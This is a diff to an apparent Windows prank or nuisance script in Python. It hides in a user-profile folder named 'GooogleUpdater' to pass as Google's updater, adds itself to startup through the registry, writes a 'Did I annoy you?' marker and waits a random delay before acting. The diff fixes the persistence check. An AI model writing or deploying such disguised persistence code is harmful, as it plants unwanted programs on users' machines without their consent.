@@ -17,7 +17,7 @@ import os
 import time
 import random
 import winreg
-
+import sys
 
 userPath = os.path.join(os.path.expandvars("%userprofile%"),"GooogleUpdater") #Setting custom path to a folder in User's folder
 def addStartup():
@@ -34,11 +34,11 @@ def addStartup():
 
 def main():
 	#Add to start up if not already
-	if not os.path.isfile(userPath+"\\//inf.ini"):
+	if not os.path.isfile(userPath+"\\inf.ini"):
+		addStartup()
 		with open(userPath+"\\inf.ini",'w+') as f:
 			f.write("Did I annoy you?")
 			f.close()
-		addStartup()
 	#Main Script
 	randomIllusion = random.randint(1,500) #Get a random breathing time
 	time.sleep(randomIllusion*60) #Waiting for the time in minutes
